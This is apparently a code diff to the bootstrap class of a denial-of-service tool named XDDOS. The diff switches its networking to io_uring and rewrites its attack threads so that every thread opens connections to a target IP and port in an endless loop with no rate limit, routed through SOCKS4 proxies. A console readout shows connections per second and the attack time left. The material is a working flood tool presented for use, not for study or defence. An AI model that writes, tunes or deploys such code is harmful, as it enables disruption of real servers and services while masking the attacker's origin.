@@ -7,14 +7,15 @@ import io.netty.channel.ChannelHandlerContext;
 import io.netty.channel.ChannelInitializer;
 import io.netty.channel.ChannelOption;
 import io.netty.channel.EventLoopGroup;
-import io.netty.channel.epoll.EpollEventLoopGroup;
-import io.netty.channel.epoll.EpollSocketChannel;
 import io.netty.channel.nio.NioEventLoopGroup;
 import io.netty.channel.socket.nio.NioSocketChannel;
 import io.netty.handler.proxy.Socks4ProxyHandler;
+import io.netty.incubator.channel.uring.IOUringEventLoopGroup;
+import io.netty.incubator.channel.uring.IOUringSocketChannel;
 import io.netty.util.ResourceLeakDetector;
 import io.netty.util.concurrent.Future;
 import io.netty.util.concurrent.GenericFutureListener;
+
 import java.net.InetAddress;
 import java.util.concurrent.CountDownLatch;
 import java.util.concurrent.ThreadFactory;
@@ -45,24 +46,24 @@ public class NettyBootstrap {
             if (System.getProperty("os.name").toLowerCase().contains("win")) {
                 socketChannel = NioSocketChannel.class;
                 loopGroup = new NioEventLoopGroup(nettyThreads, new ThreadFactory() {
-                   public Thread newThread(Runnable r) {
-                      Thread t = new Thread(r);
-                      t.setDaemon(true);
-                      t.setPriority(10);
-                      return t;
-                   }
+                    public Thread newThread(Runnable r) {
+                        Thread t = new Thread(r);
+                        t.setDaemon(true);
+                        t.setPriority(10);
+                        return t;
+                    }
                 });
-             } else {
-                socketChannel = EpollSocketChannel.class;
-                loopGroup = new EpollEventLoopGroup(nettyThreads, new ThreadFactory() {
-                   public Thread newThread(Runnable r) {
-                      Thread t = new Thread(r);
-                      t.setDaemon(true);
-                      t.setPriority(5);
-                      return t;
-                   }
+            } else {
+                socketChannel = IOUringSocketChannel.class;
+                loopGroup = new IOUringEventLoopGroup(nettyThreads, new ThreadFactory() {
+                    public Thread newThread(Runnable r) {
+                        Thread t = new Thread(r);
+                        t.setDaemon(true);
+                        t.setPriority(5);
+                        return t;
+                    }
                 });
-             }
+            }
         }
 
         method = XDDOS.method;
@@ -82,6 +83,7 @@ public class NettyBootstrap {
             public void channelInactive(ChannelHandlerContext ctx) throws Exception {
                 ctx.channel().close();
             }
+
             protected void initChannel(final Channel c) throws Exception {
                 try {
                     final ProxyLoader.Proxy proxy = NettyBootstrap.proxyLoader.getProxy();
@@ -125,13 +127,13 @@ public class NettyBootstrap {
                 XDDOS.duration = 2147483647;
             }
 
-            for(int i = 0; i < XDDOS.duration; ++i) {
+            for (int i = 0; i < XDDOS.duration; ++i) {
                 try {
                     Thread.sleep(1000L);
                 } catch (InterruptedException var2) {
                 }
                 System.out.print("\r");
-                System.out.print(XDDOS.GREEN_BOLD+"["+XDDOS.RED_BOLD+"XDDOS"+XDDOS.GREEN_BOLD+"]"+XDDOS.WHITE_BOLD+" Current CPS: "+ XDDOS.GREEN_BOLD + integer + XDDOS.WHITE_BOLD+" Average CPS: "+ XDDOS.GREEN_BOLD +totalConnections/totalSeconds+XDDOS.WHITE_BOLD+ " TARGET CPS: "+ XDDOS.GREEN_BOLD +triedCPS+XDDOS.WHITE_BOLD+" Time Left: " + XDDOS.RED_BOLD +(XDDOS.duration-totalSeconds)+" sec"+XDDOS.RESET+"                                ");
+                System.out.print(XDDOS.GREEN_BOLD + "[" + XDDOS.RED_BOLD + "XDDOS" + XDDOS.GREEN_BOLD + "]" + XDDOS.WHITE_BOLD + " Current CPS: " + XDDOS.GREEN_BOLD + integer + XDDOS.WHITE_BOLD + " Average CPS: " + XDDOS.GREEN_BOLD + totalConnections / totalSeconds + XDDOS.WHITE_BOLD + " TARGET CPS: " + XDDOS.GREEN_BOLD + triedCPS + XDDOS.WHITE_BOLD + " Time Left: " + XDDOS.RED_BOLD + (XDDOS.duration - totalSeconds) + " sec" + XDDOS.RESET + "                                ");
                 ++totalSeconds;
                 integer = 0;
                 triedCPS = 0;
@@ -146,45 +148,22 @@ public class NettyBootstrap {
 
         CountDownLatch latch = new CountDownLatch(1);
         int k;
-        if (XDDOS.targetCPS == -1) {
-            for(k = 0; k < XDDOS.loopThreads; ++k) {
-                attack = new Thread(() -> {
-                    try {
-                        latch.await();
-                    } catch (InterruptedException e) {
-                        e.printStackTrace();
-                    }
-                    while(true) {
-                        ++triedCPS;
-                        bootstrap.connect(ip, port);
-                    }
-                });
-                attack.start();
-            }
-        } else {
-            for(k = 0; k < XDDOS.loopThreads; ++k) {
-                attack = new Thread(() -> {
-                    try {
-                        latch.await();
-                    } catch (InterruptedException e) {
-                        e.printStackTrace();
-                    }
-                    while(true) {
-                        for(int j = 0; j < XDDOS.targetCPS / XDDOS.loopThreads / 10; ++j) {
-                            ++triedCPS;
-                            bootstrap.connect(ip, port);
-                        }
-
-                        try {
-                            Thread.sleep(100L);
-                        } catch (InterruptedException var3) {
-                        }
-                    }
-                });      
-                attack.start();
-            }
+        for (k = 0; k < XDDOS.loopThreads; ++k) {
+            attack = new Thread(() -> {
+                try {
+                    latch.await();
+                } catch (InterruptedException e) {
+                    e.printStackTrace();
+                }
+                while (true) {
+                    ++triedCPS;
+                    bootstrap.connect(ip, port);
+                }
+            });
+            attack.start();
         }
+
         Counter.start();
-        latch.countDown(); 
+        latch.countDown();
     }
 }
